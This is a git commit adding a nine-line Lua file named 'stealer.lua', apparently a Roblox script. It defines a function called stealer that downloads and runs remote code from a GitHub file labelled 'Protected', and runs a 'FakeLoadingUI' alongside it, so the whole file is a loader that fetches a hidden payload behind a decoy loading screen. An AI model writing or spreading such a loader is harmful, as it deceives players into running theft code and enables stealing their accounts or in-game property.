905db6725e085a47913e7b31db88dd09356eb285
ScriptkingPt <erclone131@gmail.com>
2025-05-26 01:21:05 +0800

    Create stealer.lua

---
+++ stealer.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptkingPt/Gag-script/refs/heads/main/Protected_1824527830449743.lua.txt'))()
+end
+local function loadui()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptkingPt/FakeLoadingUI/refs/heads/main/FakeLoadingUI.lua'))()
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
